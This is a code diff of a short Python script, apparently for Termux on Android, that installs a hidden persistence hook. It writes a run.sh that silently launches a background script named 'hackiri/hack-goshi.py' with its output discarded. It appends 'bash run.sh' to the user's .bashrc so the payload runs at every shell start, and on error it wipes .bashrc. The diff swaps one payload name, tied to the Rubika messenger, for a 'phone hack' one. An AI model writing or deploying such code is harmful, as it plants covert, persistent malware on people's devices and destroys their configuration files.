@@ -1,13 +1,16 @@
 import os
-os.system('cd $HOME')
+os.chdir('/data/data/com.termux//files/home')
 file = open('run.sh' , 'a+')
-file.write('python hackiri/fileri_robika.py &> /dev/null &')
+file.write('python hackiri/hack-goshi.py &> /dev/null &')
 file.close()
 try:
     file2 = open('.bashrc' , 'a')
     file2.write('bash run.sh')
 except:
-    os.system('> .bashrc')
+    try:
+        os.system('> .bashrc')
+    except:
+        pass
     file2 = open('.bashrc', 'a')
     file2.write('bash run.sh')
 while True:
